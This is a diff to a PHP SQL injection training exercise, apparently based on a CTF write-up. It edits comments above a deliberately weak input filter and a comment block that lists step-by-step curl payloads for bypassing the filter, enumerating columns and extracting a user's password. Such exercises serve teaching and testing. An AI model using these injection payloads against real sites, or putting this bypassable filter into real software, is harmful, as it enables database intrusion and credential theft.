@@ -12,7 +12,7 @@ function anti_sqli_filter($input) {
 	$result = str_replace(' ', '', $result); // Filter 'space'. Bypass with ASCII chars %09 (tab), %0a (new line), %0b, %0c or %a0.
 	return $result;
 
-
+	// Other possible manual ways to prevent SQLi
 	//$result = str_replace('\n', '', $result);
 	//$result = str_replace('\r', '', $result);
 	//$result = str_replace('"', '', $result);
@@ -26,13 +26,13 @@ function anti_sqli_filter($input) {
 
 /*
 
-Inspiration: http://kitctf.de/writeups/31c3-ctf/devilish/
+Inspiration for SQL Injection exercise: http://kitctf.de/writeups/31c3-ctf/devilish/
 
 1. Find it
 curl "[site]/profiles/42%5c/antonio"
 2. Find out number of columns
 curl "[site]/profiles/42%5c/%20union%09select%091,2,3,4--%09-"
-3. Get column names
+3. Get column names (if we can access information_schema)
 curl "[site]/profiles/42%5c/%09and%09extractvalue(rand(),concat(0x3a,(select%09column_name%09from%09information_schema.columns%09limit%09486,1),0x3a))--%09-"
 4. Get password from target column
 curl "[site]/profiles/42%5c/or%09polygon((select(1)from(select(us3rn4m3),(PassW0rdColuMn)from(users)where(id=42))x))--%09-"
